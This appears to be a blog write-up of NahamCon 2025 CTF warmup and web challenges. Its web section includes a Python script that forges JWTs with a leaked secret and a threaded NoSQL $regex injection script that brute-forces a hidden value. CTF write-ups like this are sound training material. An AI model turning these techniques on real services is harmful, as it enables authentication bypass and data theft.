---
title: nahamconctf
published: 2025-05-25
description: This post demonstrates how to include embedded video in a blog post.
tags: [nahamcon, ctf]
image: "./image/titles/nahamconlogo.png"
category: Writeups
draft: false
---

# Warmups

---

## Naham-Commencement 2025

In the source code of the web we will see the `main.js` file and it also shows how to log in to get the `flag`, according to which the user is `Caesar` encrypted with a `16-character` shift, and the password is `Vigenère` cipher encrypted with the key `nahamcon`

```javascript
function a(t) {
    let r = '';
    for (let i = 0; i < t.length; i++) {
        const c = t[i];
        if (/[a-zA-Z]/.test(c)) {
            const d = c.charCodeAt(0);
            const o = (d >= 97) ? 97 : 65;
            const x = (d - o + 16) % 26 + o;
            r += String.fromCharCode(x);
        } else {
            r += c;
        }
    }
    return r;
}

function b(t, k) {
    let r = '';
    let j = 0;
    for (let i = 0; i < t.length; i++) {
        const c = t[i];
        if (/[a-zA-Z]/.test(c)) {
            const u = c === c.toUpperCase();
            const l = c.toLowerCase();
            const d = l.charCodeAt(0) - 97;
            const m = k[j % k.length].toLowerCase();
            const n = m.charCodeAt(0) - 97;
            const e = (d + n) % 26;
            let f = String.fromCharCode(e + 97);
            if (u) {
                f = f.toUpperCase();
            }
            r += f;
            j++;
        } else {
            r += c;
        }
    }
    return r;
}

function c(s) {
    return btoa(s);
}

document.addEventListener('DOMContentLoaded', function () {
    const x1 = "dqxqcius";
    const x2 = "YeaTtgUnzezBqiwa2025";
    const x3 = "ZHF4cWNpdXM=";
    const k = "nahamcon";


    const f = document.getElementById('loginForm');
    const u = document.getElementById('username');
    const p = document.getElementById('password');
    const s = document.getElementById('spinner');
    const d = document.getElementById('result');

    f.addEventListener('submit', function (e) {
        e.preventDefault();

        const q = u.value;
        const w = p.value;


        const q1 = a(q);

        const w1 = b(w, k);

        if (q1 !== x1 || w1 !== x2) {
            d.textContent = "Access denied. Client-side validation failed. Try again.";
            d.className = "error";
            d.style.display = "block";
            return;
        }

        s.style.display = "block";
        d.style.display = "none";

        const g = new FormData();
        g.append('username', q);
        g.append('password', w);

        fetch('/login', {
            method: 'POST',
            body: g
        })
            .then(h => h.json())
            .then(z => {
                s.style.display = "none";
                d.style.display = "block";

                if (z.success) {
                    console.log("🎉 Server authentication successful!");
                    d.innerHTML = `
                    <p>${z.message}</p>
                    <p class="flag">🙌🎉${z.flag}🎉🙌</p>
                `;
                    d.className = "success";
                } else {
                    console.log("❌ Server authentication failed");
                    d.textContent = z.message;
                    d.className = "error";
                }
            })
            .catch(err => {
                console.error("🚨 Network error:", err);
                s.style.display = "none";
                d.style.display = "block";
                d.textContent = "An error occurred while processing your request.";
                d.className = "error";
            });
    });

});
```

We just need to decode it again with the information corresponding to the `username`: `dqxqcius` and the `password`: `YeaTtgUnzezBqiwa2025`

```python
def revA(text):
    result = ''
    for c in text:
        if c.isalpha():
            o = ord('a') if c.islower() else ord('A')
            x = (ord(c) - o - 16) % 26 + o
            result += chr(x)
        else:
            result += c
    return result

def revB(cipher, key):
    result = ''
    j = 0
    for i in range(len(cipher)):
        c = cipher[i]
        if c.isalpha():
            is_upper = c.isupper()
            l = c.lower()
            d = ord(l) - ord('a')
            m = key[j % len(key)].lower()
            n = ord(m) - ord('a')
            e = (d - n + 26) % 26
            f = chr(e + ord('a'))
            if is_upper:
                f = f.upper()
            result += f
            j += 1
        else:
            result += c
    return result

username = revA("dqxqcius")
password = revB("YeaTtgUnzezBqiwa2025", "nahamcon")
print(f"username : {username}")
print(f"password: {password}")

# username : nahamsec
# password: LetTheGamesBegin2025
```

![image](./image/nahamcon/1.png)

`flag: flag{c419dfe3a0a621edc0150a133bb7a34c}`

---

## Screenshot

In this challenge, just extract the content and use `HxD` to create a file from those bytes. After getting the` flag.zip` file, `unzip` it with the `password`: `password`.

![image](./image/nahamcon/2.png)

![image](./image/nahamcon/3.png)

`flag: flag{907e5bb257cd5fc818e88a13622f3d46}`

---

## Quartet

We get 4 files which are 4 components of a zip file, I put all 4 files into 1 folder and create 1 zip file then unzip the .z01 file to get 1 `quartet.jpeg` image and finally the strings search with the `flag` command to get

![image](./image/nahamcon/4.png)

`flag: flag{8f667b09d0e821f4e14d59a8037eb376}`

---

## Technical Support

at discord 

---

## Read The Rules

into source code at `/rules`

![image](./image/nahamcon/5.png)


`flag: flag{90bc54705794a62015369fd8e86e557b}`

---

## Free Flags!

In this challenge we will get back a lot of flags but we just need to filter out the content that is similar to hex characters.

```python
import re
with open("free_flags.txt", "r") as f:
    data = f.read()

flags = re.findall(r"flag\{[0-9a-f]{32}\}", data)
print(flags)
```

`flag: flag{ae6b6fb0686ec594652afe9eb6088167}`

---

## The Oddyssey

We see that after each display, we need to press enter to display more content, we need to write a script to do this.

```python
import socket
import time

HOST = "challenge.nahamcon.com"
PORT = 32583

with socket.create_connection((HOST, PORT)) as s:
    while True:
        data = s.recv(4096)
        if not data:
            break

        text = data.decode(errors="ignore")
        print(text, end="") 

        if "flag{" in text:
            print("\n\n Found 'flag{', stopping now!")
            break

        if "Press enter to continue..." in text:
            s.sendall(b"\n")
            time.sleep(0.1)
```

`flag: flag{0b51aae6b09b85d1bb13b0b8c3003a6a}`

---

# Web

---

## SNAD

**Game object:**
* Place 7 grains of sand in the correct position and color according to the following information:

```javascript
const requiredGrains = 7;
const targetPositions = [
  { x: 367, y: 238, colorHue: 0 },     // red
  { x: 412, y: 293, colorHue: 40 },    // orange
  { x: 291, y: 314, colorHue: 60 },    // yellow
  { x: 392, y: 362, colorHue: 120 },   // green
  { x: 454, y: 319, colorHue: 240 },   // blue
  { x: 349, y: 252, colorHue: 280 },   // purple
  { x: 433, y: 301, colorHue: 320 }    // pink
];
```

**Solution:**

inject console :

```javascript
injectSand(367, 238, 0)
injectSand(412, 293, 40)
injectSand(291, 314, 60)
injectSand(392, 362, 120)
injectSand(454, 319, 240)
injectSand(349, 252, 280)
injectSand(433, 301, 320)
```

![image](./image/nahamcon/6.png)

`flag: flag{6ff0c72ad11bf174139e970559d9b5d2}`

---

## Infinite Queue

In this challenge, we are provided with a ticket purchasing website but are provided with a `token` and in the `token` there is a `queue_time` variable used to return the time received, accordingly I made the token error to see the reaction and finally the system exposed `JWT_SECRET`, based on this I created a fake token to reduce the time.

![image](./image/nahamcon/7.png)

![image](./image/nahamcon/8.png)

`JWT_SECRET: 4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC`

create token: 

```python
import jwt
import time

secret = "4A4Dmv4ciR477HsGXI19GgmYHp2so637XhMC"

payload = {
    "user_id": "a@gmail.com",
    "queue_time": time.time() - 60, 
    "exp": 5348295616
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

After checking that the injection was successful, we did not get the `flag`. After I searched the source, I found that we need to buy it again to `authenticate` so that the system can return the `flag` to us.

![image](./image/nahamcon/9.png)

![image](./image/nahamcon/10.png)

![image](./image/nahamcon/11.png)

`flag: flag{b1bd4795215a7b81699487cc7e32d936}`

---

## NoSequel

IIn this challenge said all is `no sql`, after a while injecting query then i realized that need to send `flag` in query and only regex is used

![image](./image/nahamcon/12.png)

and

![image](./image/nahamcon/13.png)

and what we need to do is compare if the string we enter is the same as the `flag` then it will return `Pattern matched` otherwise it will be an `error`

![image](./image/nahamcon/14.png)

![image](./image/nahamcon/15.png)

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor

url = "http://challenge.nahamcon.com:30580/search"
chars = string.ascii_letters + string.digits + "}"
flag =  "flag{"

def test_char(known_flag, char):
    payload = f'{% raw %}flag: {{$regex: "{known_flag}{char}"}}{% endraw %}'
    data = {
        'query': payload,
        'collection': 'flags'
    }
    response = requests.post(url, data=data)
    return char if "Pattern matched" in response.text else None

for i in range(50): 
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(test_char, flag, char) for char in chars]
        found = False
        for future in futures:
            result = future.result()
            if result:
                flag += result
                print(f"[+] Found: {flag}")
                found = True
                break
        if not found and "}" in result:
            print("[-] Done or blocked.")
            break

print(f"[✓] Final flag: {flag}")
```

`flag: flag{4cb8649d9ecb0ec59d1784263602e686}`

---